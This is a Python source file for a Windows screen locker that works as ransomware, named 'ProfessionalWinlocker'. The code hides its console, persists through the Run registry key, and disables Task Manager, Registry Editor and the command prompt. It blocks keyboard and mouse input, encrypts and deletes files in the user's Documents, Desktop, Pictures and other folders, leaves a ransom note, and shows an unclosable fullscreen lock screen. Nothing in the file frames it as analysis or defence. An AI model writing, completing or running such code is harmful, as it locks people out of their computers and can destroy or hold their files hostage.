import os
import sys
import ctypes
from cryptography.fernet import Fernet
import hashlib
import tkinter as tk
from tkinter import messagebox
import subprocess
import time
import getpass
import base64

class ProfessionalWinlocker:
    def __init__(self):
        self.username = getpass.getuser()
        self.unlock_password = "Fonbet 1337"
        # Generate key based on password
        self.key = self.generate_key_from_password(self.unlock_password)
        self.cipher = Fernet(self.key)
        self.unlocked = False
        
    def generate_key_from_password(self, password):
        """Generate Fernet key from password"""
        # Hash the password to get 32 bytes for Fernet
        key_hash = hashlib.sha256(password.encode()).digest()
        # Fernet requires base64 encoded 32 bytes
        return base64.urlsafe_b64encode(key_hash)
        
    def disable_task_manager(self):
        """Disable Task Manager"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            
            # Also try alternative method
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def disable_regedit(self):
        """Disable Registry Editor"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def disable_cmd(self):
        """Disable Command Prompt"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Policies\Microsoft\Windows\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
            winreg.CloseKey(key)
        except:
            pass
    
    def check_password(self, password_entry, window):
        """Check if entered password is correct"""
        if password_entry.get() == self.unlock_password:
            self.unlocked = True
            self.restore_system(window)
        else:
            messagebox.showerror("Error", "Wrong password!")
    
    def restore_system(self, window):
        """Restore system when unlocked"""
        try:
            # Enable Task Manager
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
            # Enable Explorer policies
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
            # Enable CMD
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Policies\Microsoft\Windows\System",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
        
        # Unblock input
        try:
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        
        # Decrypt files
        self.decrypt_files()
        
        # Remove from startup
        self.remove_from_startup()
        
        # Close window and exit
        window.quit()
        window.destroy()
        sys.exit(0)
    
    def remove_from_startup(self):
        """Remove from startup"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SystemSecurity")
            winreg.CloseKey(key)
        except:
            pass
    
    def set_fullscreen_window(self):
        """Create fullscreen lock window with password check"""
        try:
            window = tk.Tk()
            window.attributes('-fullscreen', True)
            window.attributes('-topmost', True)
            window.configure(bg='#0a0a0a')
            
            # Prevent closing
            window.protocol("WM_DELETE_WINDOW", lambda: None)
            
            # Bind all keys to prevent Alt+F4 etc
            def disable_event(event):
                if event.keysym in ('Alt_L', 'Alt_R', 'F4', 'Escape', 'Tab', 'Control_L', 'Control_R'):
                    return "break"
            
            window.bind_all('<Key>', disable_event)
            window.bind_all('<Alt-F4>', lambda e: "break")
            window.bind_all('<Control-Alt-Delete>', lambda e: "break")
            window.bind_all('<Escape>', lambda e: "break")
            
            # Main frame
            main_frame = tk.Frame(window, bg='#0a0a0a')
            main_frame.pack(expand=True, fill='both')
            
            # Lock icon
            lock_label = tk.Label(main_frame, 
                                 text="🔒", 
                                 fg="#ff4444", 
                                 bg="#0a0a0a", 
                                 font=("Arial", 72))
            lock_label.pack(pady=20)
            
            # Title
            title_label = tk.Label(main_frame, 
                                  text="SYSTEM LOCKED", 
                                  fg="#ff4444", 
                                  bg="#0a0a0a", 
                                  font=("Arial", 48, "bold"))
            title_label.pack()
            
            # Message
            message_label = tk.Label(main_frame,
                                    text=f"This computer has been locked.\nUser: {self.username}\n\nEnter password to unlock:",
                                    fg="white",
                                    bg="#0a0a0a",
                                    font=("Arial", 16))
            message_label.pack(pady=30)
            
            # Password frame
            password_frame = tk.Frame(main_frame, bg='#0a0a0a')
            password_frame.pack()
            
            # Password entry
            password_entry = tk.Entry(password_frame, 
                                     show="•", 
                                     font=("Arial", 14),
                                     width=20,
                                     bg="#1a1a1a",
                                     fg="white",
                                     insertbackground="white",
                                     bd=0)
            password_entry.pack(side='left', padx=5)
            password_entry.focus_set()
            
            # Unlock button
            unlock_button = tk.Button(password_frame,
                                     text="Unlock",
                                     command=lambda: self.check_password(password_entry, window),
                                     font=("Arial", 12),
                                     bg="#333333",
                                     fg="white",
                                     activebackground="#444444",
                                     activeforeground="white",
                                     relief='flat',
                                     padx=15,
                                     bd=0)
            unlock_button.pack(side='left', padx=5)
            
            # Bind Enter key
            password_entry.bind('<Return>', lambda e: self.check_password(password_entry, window))
            
            # Note
            note_label = tk.Label(main_frame,
                                 text="Contact system administrator for password.\nPassword: Fonbet 1337",
                                 fg="#666666",
                                 bg="#0a0a0a",
                                 font=("Arial", 10))
            note_label.pack(pady=40)
            
            window.mainloop()
        except Exception as e:
            print(f"Error: {e}")
    
    def block_input(self):
        """Block keyboard/mouse input except for our window"""
        try:
            # Try multiple times to ensure block
            for _ in range(3):
                ctypes.windll.user32.BlockInput(True)
                time.sleep(0.1)
        except:
            pass
    
    def add_to_startup(self):
        """Add to startup"""
        try:
            # Get the path of the executable
            if getattr(sys, 'frozen', False):
                application_path = sys.executable
            else:
                application_path = os.path.abspath(__file__)
            
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemSecurity", 0, winreg.REG_SZ, application_path)
            winreg.CloseKey(key)
        except:
            pass
    
    def encrypt_files(self):
        """Encrypt user documents with password-based key"""
        try:
            user_home = os.path.expanduser("~")
            paths = [
                os.path.join(user_home, "Documents"),
                os.path.join(user_home, "Desktop"),
                os.path.join(user_home, "Pictures"),
                os.path.join(user_home, "Videos"),
                os.path.join(user_home, "Music"),
                os.path.join(user_home, "Downloads")
            ]
            
            encrypted_count = 0
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            # Target file extensions
                            if file.endswith(('.doc', '.docx', '.xls', '.xlsx', '.pdf', '.txt', 
                                            '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.mp4', 
                                            '.zip', '.rar', '.7z', '.py', '.cpp', '.c', '.java')):
                                try:
                                    filepath = os.path.join(root, file)
                                    # Skip if already locked
                                    if file.endswith('.fonbet'):
                                        continue
                                    
                                    # Skip if too large (avoid memory issues)
                                    if os.path.getsize(filepath) > 50 * 1024 * 1024:  # 50MB limit
                                        continue
                                        
                                    with open(filepath, 'rb') as f:
                                        data = f.read()
                                    encrypted = self.cipher.encrypt(data)
                                    new_filepath = filepath + '.fonbet'
                                    with open(new_filepath, 'wb') as f:
                                        f.write(encrypted)
                                    os.remove(filepath)
                                    encrypted_count += 1
                                except:
                                    pass
            
            # Create ransom note
            note_path = os.path.join(user_home, "Desktop", "UNLOCK_INSTRUCTIONS.txt")
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(f"""========================================
YOUR FILES HAVE BEEN ENCRYPTED
========================================

{encrypted_count} files have been encrypted with .fonbet extension.

To unlock your computer and files, enter the password: Fonbet 1337

If the password doesn't work, contact the administrator.

DO NOT RESTART YOUR COMPUTER
DO NOT TRY TO REMOVE THE LOCK
========================================
""")
        except:
            pass
    
    def decrypt_files(self):
        """Decrypt files when unlocked"""
        try:
            user_home = os.path.expanduser("~")
            for root, dirs, files in os.walk(user_home):
                for file in files:
                    if file.endswith('.fonbet'):
                        try:
                            filepath = os.path.join(root, file)
                            with open(filepath, 'rb') as f:
                                encrypted_data = f.read()
                            decrypted_data = self.cipher.decrypt(encrypted_data)
                            original_filepath = filepath[:-7]  # Remove .fonbet
                            with open(original_filepath, 'wb') as f:
                                f.write(decrypted_data)
                            os.remove(filepath)
                        except:
                            pass
            
            # Remove ransom note
            note_path = os.path.join(user_home, "Desktop", "UNLOCK_INSTRUCTIONS.txt")
            if os.path.exists(note_path):
                os.remove(note_path)
        except:
            pass
    
    def execute(self):
        """Execute all functions"""
        self.add_to_startup()
        self.disable_task_manager()
        self.disable_regedit()
        self.disable_cmd()
        self.block_input()
        self.encrypt_files()
        self.set_fullscreen_window()

if __name__ == "__main__":
    # Hide console
    try:
        if sys.platform == 'win32':
            wh = ctypes.windll.kernel32.GetConsoleWindow()
            if wh:
                ctypes.windll.user32.ShowWindow(wh, 0)
    except:
        pass
    
    winlocker = ProfessionalWinlocker()
    winlocker.execute()
